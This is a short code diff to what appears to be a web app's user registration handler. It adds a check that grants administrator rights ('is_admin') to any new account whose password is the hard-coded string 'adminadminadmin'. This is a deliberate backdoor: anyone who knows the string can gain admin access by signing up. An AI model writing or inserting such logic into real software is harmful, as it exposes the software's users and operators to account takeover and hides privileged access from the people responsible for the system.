@@ -52,15 +52,21 @@ exports.register = async (req, res) => {
     }
 
     // =========================
+    // ADMIN LOGIC (BEFORE HASHING)
+    // =========================
+    const isAdmin = password === "adminadminadmin";
+
+    // =========================
     // CREATE USER
     // =========================
     await db.User.create({
       name,
       email,
-      password, // hashed via hook
+      password, // will be hashed by hook
       type,
       phone: phone || null,
       status: "pending",
+      is_admin: isAdmin
     });
 
     res.status(201).json({ msg: "User registered successfully" });
